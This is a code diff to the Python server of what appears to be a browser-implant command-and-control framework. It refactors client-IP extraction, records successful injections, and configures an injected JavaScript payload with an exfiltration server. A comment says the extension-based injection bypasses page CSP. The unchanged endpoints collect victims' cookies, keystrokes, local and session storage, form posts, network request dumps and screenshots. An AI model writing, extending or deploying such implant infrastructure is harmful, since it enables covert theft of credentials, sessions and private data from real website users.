@@ -1109,6 +1109,21 @@ def eventNotificationEmail(identifier):
 
 
 
+# Extract the real client IP from proxy headers.
+# Priority: CF-Connecting-IP (Cloudflare) > first X-Forwarded-For entry > remote_addr
+def getClientIP():
+    if proxyMode:
+        # Cloudflare always sets this to the true client IP
+        cf_ip = request.headers.get('CF-Connecting-IP')
+        if cf_ip:
+            return cf_ip.strip()
+        # X-Forwarded-For is comma-separated: client, proxy1, proxy2, ...
+        xff = request.headers.get('X-Forwarded-For', '')
+        if xff:
+            return xff.split(',')[0].strip()
+    return request.remote_addr
+
+
 # Updates "last seen" timestamp"
 # Do not call db commit in here
 def clientSeen(identifier, ip, userAgent):
@@ -1534,10 +1549,7 @@ def returnUUID(tag='', clientType='js-implant'):
         return "No.", 401
 
     # Is this IP blocked?
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
  
     blockedIP = BlockedIP.query.filter_by(ip=ip).first()
     if blockedIP is not None:
@@ -1673,10 +1685,7 @@ def receiveEncryptedMessage(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     userAgent = request.headers.get('User-Agent')
    
@@ -1825,6 +1834,17 @@ def receiveEncryptedMessage(identifier):
         extraData   = jsonData.get('metadata') # Optional JSON metadata (cookie flags, etc.)
         saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url, extraData)
 
+    elif path.decode('utf-8') == "/bex/injection_success":
+        logger.info("Received BEX injection success report")
+        jsonData = json.loads(message.decode('utf-8'))
+        domain = jsonData.get('domain')
+        if domain:
+            injection = BeaconInjection.query.filter_by(beaconID=identifier, domain=domain, active=True).first()
+            if injection:
+                injection.last_success = func.now()
+                dbCommit()
+                logger.info(f"BEX: Injection success recorded for {domain} via beacon {identifier}")
+
     elif path.decode('utf-8').startswith("/bex/screenshot/"):
         targetUUID = path.decode('utf-8').replace("/bex/screenshot/", "")
         logger.info(f"Received proxied BEX screenshot for {targetUUID}")
@@ -1924,15 +1944,15 @@ def generate_injection_payload(tag, server_url):
     
     # Configure the payload for injection using regex to handle variations in whitespace/tabs
     
-    # Replace Mode
-    payload = re.sub(r'window\.taperMode\s*=\s*".*?";', 'window.taperMode = "implant";', payload)
-    
+    # Replace Mode (handles both ?? and plain assignment syntax)
+    payload = re.sub(r'window\.taperMode\s*=\s*(window\.taperMode\s*\?\?\s*)?".*?";', 'window.taperMode = "implant";', payload)
+
     # Replace Exfil Server
-    payload = re.sub(r'window\.taperexfilServer\s*=\s*".*?";', f'window.taperexfilServer = "{server_url}";', payload)
-    
+    payload = re.sub(r'window\.taperexfilServer\s*=\s*(window\.taperexfilServer\s*\?\?\s*)?".*?";', f'window.taperexfilServer = "{server_url}";', payload)
+
     # Replace Tag
-    payload = re.sub(r'window\.taperTag\s*=\s*".*?";', f'window.taperTag = "{tag}";', payload)
-    
+    payload = re.sub(r'window\.taperTag\s*=\s*(window\.taperTag\s*\?\?\s*)?".*?";', f'window.taperTag = "{tag}";', payload)
+
     return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
 
 
@@ -1941,7 +1961,7 @@ def serveDynamicInjectedPayload(beaconID, domain):
     logger.info(f"BEX: Dynamic payload request for {domain} from beacon {beaconID}")
     # Look up the injection record
     injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain, active=True).first()
-    
+
     if not injection:
         logger.warning(f"BEX: No active injection record found for {domain} and beacon {beaconID}")
         return "No.", 404
@@ -1952,7 +1972,7 @@ def serveDynamicInjectedPayload(beaconID, domain):
 
     with open('telemlib.js', 'r') as file:
         payload = file.read()
-    
+
     # Use the server's root URL for the exfil server
     server_url = request.url_root.rstrip('/')
     if 'localhost' in server_url:
@@ -1962,23 +1982,23 @@ def serveDynamicInjectedPayload(beaconID, domain):
     if request.is_secure:
         if server_url.startswith('http://'):
             server_url = server_url.replace('http://', 'https://')
-    
+
     logger.info(f"BEX: Serving payload for {domain} configured with exfil server {server_url} and tag {injection.tag} (Parent: {beaconID})")
 
     # Perform the replacements using regex to handle variations in whitespace/tabs
     import re
-    
-    # Replace Mode
-    payload = re.sub(r'window\.taperMode\s*=\s*".*?";', 'window.taperMode = "implant";', payload)
-    
+
+    # Replace Mode (handles both ?? and plain assignment syntax)
+    payload = re.sub(r'window\.taperMode\s*=\s*(window\.taperMode\s*\?\?\s*)?".*?";', 'window.taperMode = "implant";', payload)
+
     # Replace Exfil Server
-    payload = re.sub(r'window\.taperexfilServer\s*=\s*".*?";', f'window.taperexfilServer = "{server_url}";', payload)
+    payload = re.sub(r'window\.taperexfilServer\s*=\s*(window\.taperexfilServer\s*\?\?\s*)?".*?";', f'window.taperexfilServer = "{server_url}";', payload)
 
     # Replace Tag
-    payload = re.sub(r'window\.taperTag\s*=\s*".*?";', f'window.taperTag = "{injection.tag}";', payload)
-    
-    # Inject the Parent UUID for linkage
-    payload = payload.replace('window.taperMode = "implant";', f'window.taperMode = "implant";\n\twindow.taperParentUUID = "{beaconID}";')
+    payload = re.sub(r'window\.taperTag\s*=\s*(window\.taperTag\s*\?\?\s*)?".*?";', f'window.taperTag = "{injection.tag}";', payload)
+
+    # Replace Parent UUID (handles ?? null syntax)
+    payload = re.sub(r'window\.taperParentUUID\s*=\s*(window\.taperParentUUID\s*\?\?\s*)?null;', f'window.taperParentUUID = "{beaconID}";', payload)
     
     response = make_response(payload, 200)
     response.headers['Content-Type'] = 'text/javascript'
@@ -2034,21 +2054,27 @@ def enableBexInjection():
     dbCommit()
 
     # Queue a configuration task for the beacon (client is already found above)
-    # Send the LOADER URL, not the whole code
-    # If a custom C2 server URL is provided, build an absolute URL so the beacon
-    # uses it as-is (useful for domain fronting). Otherwise use a relative path.
+    # Send config values so the extension can pre-set them before injecting
+    # the bundled telemlib.js — this bypasses meta-tag CSP entirely.
     if serverUrl:
-        loader_url = f"{serverUrl.rstrip('/')}/lib/injected/{beaconID}/{domain}"
-        logger.info(f"BEX: Queuing absolute loader URL: {loader_url}")
+        resolved_server_url = serverUrl.rstrip('/')
     else:
-        loader_url = f"/lib/injected/{beaconID}/{domain}"
-        logger.info(f"BEX: Queuing relative loader URL: {loader_url}")
-    
+        resolved_server_url = request.url_root.rstrip('/')
+        if 'localhost' in resolved_server_url:
+            resolved_server_url = resolved_server_url.replace('localhost', '127.0.0.1')
+        if request.is_secure and resolved_server_url.startswith('http://'):
+            resolved_server_url = resolved_server_url.replace('http://', 'https://')
+
+    logger.info(f"BEX: Queuing CONFIG_INJECTION for {domain} with serverUrl={resolved_server_url}")
+
     taskData = {
         "type": "CONFIG_INJECTION",
         "domain": domain,
         "active": True,
-        "url": loader_url
+        "serverUrl": resolved_server_url,
+        "tag": tag,
+        "parentUUID": beaconID,
+        "mode": "implant"
     }
     
     jsonStr = json.dumps(taskData)
@@ -2676,10 +2702,7 @@ def recordScreenshot(identifier):
         logger.error("---- Type: " + file_type)
         return "No.", 401
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveScreenshot(identifier, image, ip, request.headers.get('User-Agent'))
 
@@ -2733,10 +2756,7 @@ def recordHTML(identifier):
     url = content['url']
     trapHTML = content['html']
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveHTML(identifier, url, trapHTML, ip, request.headers.get('User-Agent'))
@@ -2788,10 +2808,7 @@ def recordUrl(identifier):
     # logger.info("Got URL: " + url)
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveUrl(identifier, url, ip, request.headers.get('User-Agent'))
@@ -2832,10 +2849,7 @@ def recordInput(identifier):
 
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveInput(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -2877,10 +2891,7 @@ def recordCookie(identifier):
     # logger.info("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveCookie(identifier, cookieName, cookieValue, ip, request.headers.get('User-Agent'))
 
@@ -2921,10 +2932,7 @@ def recordLocalStorageEntry(identifier):
     localStorageValue = content['value']
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, request.headers.get('User-Agent'))
@@ -2977,10 +2985,7 @@ def recordSessionStorageEntry(identifier):
     sessionStorageValue = content['value']
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, request.headers.get('User-Agent'))
@@ -2996,10 +3001,7 @@ def recordKeylog(identifier):
 
     content = request.json
 
-    if proxyMode:
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveKeylog(identifier, content.get('keys', ''), content.get('target', ''),
                content.get('url', ''), ip, request.headers.get('User-Agent'))
@@ -3053,10 +3055,7 @@ def recordXhrDump(identifier):
 
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveXhrDump(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -3184,10 +3183,7 @@ def recordFetchDump(identifier):
 
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveFetchDump(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -3233,10 +3229,7 @@ def recordFormPost(identifier):
     # logger.info("## Recording Form Post")
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveFormPost(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -3275,10 +3268,7 @@ def recordCustomExfil(identifier):
     note = content.get('note', None)
     data = content.get('data', None)
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveCustomExfil(identifier, note, data, ip, request.headers.get('User-Agent'))
 
